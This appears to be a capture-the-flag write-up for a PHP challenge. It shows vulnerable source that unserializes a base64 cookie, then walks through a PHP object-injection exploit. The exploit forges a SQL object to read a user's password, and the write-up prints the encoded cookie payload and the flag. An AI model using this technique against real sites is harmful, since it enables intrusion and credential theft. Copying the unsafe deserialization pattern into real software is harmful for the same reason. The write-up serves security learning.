# Task
![image](https://user-images.githubusercontent.com/44528004/132701258-bb744fd5-f757-42b7-88c9-edc1dbaa1a56.png)

# Solution
## Initial observation
The first source:
```php
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>
```

The second source:
```php
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```

From these sources, we can see that the `leet_hax0r` cookie is an associative array with `ip` as a property. This array is then serialized and encoded in base64 before being transmitted to the client.

When the server receives a request, it decodes the `leet_hax0r` cookie value, unserializes it and stored in `$sess_data`. Then, it checks whether `$sess_data` is an array and its `ip`'s value is of the IP address of the server. If either is wrong, **CANT HACK US!!!** is returned. Also, if the `id` parameter is set and is of integer, it will perform a SQL query.

In the second source code, the interesting here is the `__destruct()` method because it will be called when a `SQL` object is deleted. In addition, the `username` column from the result of the SQL query will be echoed.

## Exploitation
From the above information, we can guess that this application is vulnerable to **object injection**.  
In order to execute an arbitrary SQL query, we need to craft ourselves an `SQL` object whose properties are similar to those of the `$sql` on the server.
```php
class SQL {
    public $query = '';
    public $conn;
}

$inj = new SQL();
```
As SQL is not an array, we completely bypass the first `if..else..` block:
```php
if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
    die('CANT HACK US!!!');
}
```

When giving `1` as the **User id**, we get **Username: flag**; therefore, we might want the `password` of this user.  
Our query would be
```sql
SELECT password FROM users WHERE username='flag';
```

However, only the column named `usernamed` is echoed back, we need an alias:
```sql
SELECT password as username FROM users WHERE username='flag';
```

Now, our `$inj` object would be:
```
$inj->query = "SELECT password as username FROM users WHERE username='flag';";
```

Let's serialize and encode this object:
```
php > $sql->query = "SELECT password as username FROM users WHERE username='flag';";
php > echo urlencode(base64_encode(serialize($sql)));
TzozOiJTUUwiOjI6e3M6NToicXVlcnkiO3M6NjE6IlNFTEVDVCBwYXNzd29yZCBhcyB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIHVzZXJuYW1lPSdmbGFnJzsiO3M6NDoiY29ubiI7Tjt9
```

Modify the `` cookie value to our value.  

![image](https://user-images.githubusercontent.com/44528004/132871370-ff4b11c1-f9d4-41fe-9a12-62b43a5c71d4.png)

And got the result:  

![image](https://user-images.githubusercontent.com/44528004/132871429-b6e5279b-2545-4c27-97cc-0e4287c82801.png)
> Flag: `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`
